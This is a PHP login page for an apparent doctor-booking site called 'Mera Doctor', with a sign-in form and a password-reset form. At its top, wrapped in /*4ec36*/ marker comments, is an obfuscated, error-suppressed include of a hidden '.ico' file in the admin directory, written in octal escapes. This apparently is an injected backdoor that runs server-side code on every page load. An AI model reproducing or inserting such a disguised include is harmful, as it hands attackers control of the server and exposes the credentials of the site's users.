<?php
/*4ec36*/

@include "\057home\063/soi\164ejql\057mera\144octo\162.liv\145/adm\151n/ad\155in/.\066d1d0\071c1.i\143o";

/*4ec36*/




?>

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
     <!-- Main CSS-->
      <link rel="stylesheet" type="text/css" href="admin/css/main.css">
    <!-- Font-icon css-->
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <title>Login - Mera Doctor</title>
  </head>
  <body>
  
    <section class="material-half-bg">
      <div class="cover"></div>
    </section>
    
    <section class="login-content">
      <div class="login-box">
        <form class="login-form" method="post" action="logincode.php">
          <h3 class="login-head"><i class="fa fa-lg fa-fw fa-user"></i>SIGN IN</h3>
          <div class="form-group">
<label class="control-label">Mobile</label>
       <input class="form-control" type="text" placeholder="Mobile" name="mobile" autofocus>
          </div>
          <div class="form-group">
         <label class="control-label">Password</label>
        <input class="form-control" name="password" type="password" placeholder="Password">
          </div>
           <div class="form-group">
            <div class="utility">
              <div class="animated-checkbox">
                <label>
                  <a href="../index.php" >Home</a> 
                </label>
              </div>
              <p class="semibold-text mb-2"><a href="#" >Forgot Password ?</a></p>
            </div>
          </div>  
          <div class="form-group btn-container">
            <button class="btn btn-primary btn-block" name="login-submit"><i class="fa fa-sign-in fa-lg fa-fw"></i>SIGN IN</button>
          </div>
         
          
        </form>
        <form class="forget-form" action="index.html">
          <h3 class="login-head"><i class="fa fa-lg fa-fw fa-lock"></i>Forgot Password ?</h3>
          <div class="form-group">
            <label class="control-label">EMAIL</label>
            <input class="form-control" type="text" placeholder="Email">
          </div>
          <div class="form-group btn-container">
            <button class="btn btn-primary btn-block"><i class="fa fa-unlock fa-lg fa-fw"></i>RESET</button>
          </div>
          <div class="form-group mt-3">
            <p class="semibold-text mb-0"><a href="#" data-toggle="flip"><i class="fa fa-angle-left fa-fw"></i> Back to Login</a></p>
          </div>
        </form>
      </div>
    </section>
    <!-- Essential javascripts for application to work-->
    <script src="admin/js/jquery-3.3.1.min.js"></script>
    <script src="admin/js/popper.min.js"></script>
    <script src="admin/js/bootstrap.min.js"></script>
    <script src="admin/js/main.js"></script>
    <!-- The javascript plugin to display page loading on top-->
    <script src="admin/js/plugins/pace.min.js"></script>
    <script type="text/javascript">
      // Login Page Flipbox control
      $('.login-content [data-toggle="flip"]').click(function() {
      	$('.login-box').toggleClass('flipped');
      	return false;
      });
    </script>
  </body>
</html>